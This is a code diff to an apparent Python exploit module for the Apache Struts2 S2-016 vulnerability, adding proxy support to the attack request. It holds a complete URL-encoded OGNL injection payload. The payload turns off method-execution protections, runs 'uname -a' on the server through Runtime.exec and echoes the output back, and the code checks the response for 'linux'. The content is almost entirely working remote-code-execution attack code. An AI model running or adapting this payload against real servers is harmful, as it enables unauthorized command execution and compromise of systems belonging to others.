@@ -15,7 +15,7 @@ def UrlProcessing(url):
 
 payload='''redirect%3a%24%7b%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2c%23f.setAccessible(true)%2c%23f.set(%23_memberAccess%2ctrue)%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec(%22uname+-a%22).getInputStream()%2c%23b%3dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew+java.io.BufferedReader(%23b)%2c%23d%3dnew+char%5b5000%5d%2c%23c.read(%23d)%2c%23genxor%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2c%23genxor.println(%23d)%2c%23genxor.flush()%2c%23genxor.close()%7d%e8%8e%b7%e5%8f%96web%e7%9b%ae%e5%bd%95%ef%bc%9a
 '''
-def S2_016(Url,RandomAgent):
+def S2_016(Url,RandomAgent,ProxyIp):
 
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
@@ -40,7 +40,14 @@ def S2_016(Url,RandomAgent):
     }
     s = requests.session()
     try:
-        resp = s.get(payload_url,headers=headers, timeout=5, verify=False)
+        if ProxyIp != None:
+            proxies = {
+                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
+                "http": "http://" + str(ProxyIp)
+            }
+            resp = s.get(payload_url, headers=headers, proxies=proxies,timeout=5, verify=False)
+        elif ProxyIp == None:
+            resp = s.get(payload_url,headers=headers, timeout=5, verify=False)
         con = resp.text
         code = resp.status_code
         if code==200 and con.lower().find('linux')!=-1:
